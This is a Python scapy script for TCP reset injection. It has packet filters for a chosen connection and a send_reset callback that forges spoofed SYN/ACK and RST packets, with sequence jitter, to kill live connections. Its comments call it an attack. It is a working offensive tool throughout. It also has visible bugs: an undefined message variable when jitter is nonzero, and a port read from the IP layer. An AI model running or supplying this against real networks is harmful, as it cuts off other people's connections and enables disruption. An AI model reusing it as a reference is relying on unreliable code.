#!/usr/bin/env python3
from scapy.all import *
import logging
import random

logger = logging.getLogger(__name__)


def log(msg, params={}, **kwargs):
    formatted_params = " ".join([f"{k}={v}" for k, v in params.items()])
    logger.info(f"{msg} {formatted_params}")


def is_adapter_localhost(adapter, localhost_ip):
    return len([ip for ip in adapter.ips if ip.ip == localhost_ip]) > 0


def is_packet_tcp_server_to_client(server_ip, client_ip=None, server_port=None):
    def f(p):
        if not p.haslayer(TCP):
            return False

        _ip_type = _get_ip_type(p)

        src_ip = p[_ip_type].src
        src_port = p[TCP].sport
        dst_ip = p[_ip_type].dst

        attr_dict = {
            "server_ip" : (server_ip, src_ip),
            "client_ip" : (client_ip, dst_ip),
            "server_port" : (server_port, src_port)
        }
        test = False
        for attr, value in attr_dict.items():
            if not value[0]:
                continue
            test = value[0] == value[1]
            if not test:
                return False
        # test = src_ip == ser and src_port == server_port
        return test

    return f


def is_packet_tcp_client_to_server(client_ip, server_ip=None, server_port=None):
    def f(p):
        if not p.haslayer(TCP):
            return False

        _ip_type = _get_ip_type(p)

        src_ip = p[_ip_type].src
        dst_ip = p[_ip_type].dst
        dst_port = p[_ip_type].dport

        attr_dict = {
            "server_ip" : (server_ip, dst_ip),
            "client_ip" : (client_ip, src_ip),
            "server_port" : (server_port, dst_port)
        }
        test = False
        for attr, value in attr_dict.items():
            if not value[0]:
                continue
            test = value[0] == value[1]
            if not test:
                return False

        return test

    return f


def is_packet_on_tcp_conn(server_ip, client_ip, server_port):
    def f(p):
        res = (
            is_packet_tcp_server_to_client(server_ip, client_ip, server_port)(p) or
            is_packet_tcp_client_to_server(client_ip, server_ip, server_port)(p)
        )
        return res

    return f


def _get_ip_type(packet):
    # In order for this attack to work on Linux, we must
    # use L3RawSocket, which under the hood sets up the socket
    # to use the PF_INET "domain". This is required because of the
    # way localhost works on Linux.
    #
    # See https://scapy.readthedocs.io/en/latest/troubleshooting.html#i-can-t-ping-127-0-0-1-scapy-does-not-work-with-127-0-0-1-or-on-the-loopback-interface for more details.
    if packet.type == 34525:
        _ip_type = IPv6
        conf.L3socket = L3RawSocket6
    else:
        _ip_type = IP
        conf.L3socket = L3RawSocket
    return _ip_type


def send_reset(iface, seq_jitter=0, ignore_syn=True, window_size=2052, verbose=0):

    def f(p):

        _ip_type = _get_ip_type(p)

        src_ip = p[_ip_type].src
        src_port = p[TCP].sport
        dst_ip = p[_ip_type].dst
        dst_port = p[TCP].dport
        seq = p[TCP].seq
        ack = p[TCP].ack
        flags = p[TCP].flags

        log(
            "Grabbed packet",
            {
                "src_ip": src_ip,
                "dst_ip": dst_ip,
                "src_port": src_port,
                "dst_port": dst_port,
                "seq": seq,
                "ack": ack,
            }
        )

        if "S" in flags and ignore_syn:
            logger.info("Packet has SYN flag -> not sending RST")
            return

        # Don't allow a -ve seq
        jitter = random.randint(max(-seq_jitter, -seq), seq_jitter)
        if jitter == 0:
            _jit_msg = "jitter == 0, this RST packet should close the connection"

        rst_seq = ack + jitter


        log(
            f"Sending RST packet... {_jit_msg}",
            {
                "orig_ack": ack,
                "jitter": jitter,
                "seq": rst_seq,
            },
        )

        ip_data = dict(
            src=dst_ip,
            dst=src_ip
        )

        tcp_data = dict(
            sport=dst_port,
            dport=src_port,
            window=window_size,
            seq=rst_seq
        )

        # send also a SYN/ACK first ... just to put some doubts in the kernel ...
        for flag in ('SA', 'R'):
            tcp_data['flags'] = flag

            p = _ip_type(**ip_data) / TCP(**tcp_data)
            send(p, verbose=verbose, iface=iface)

    return f


def log_packet(p):
    """This prints a big pile of debug information. We could make a prettier
    log function if we wanted."""
    return p.show()
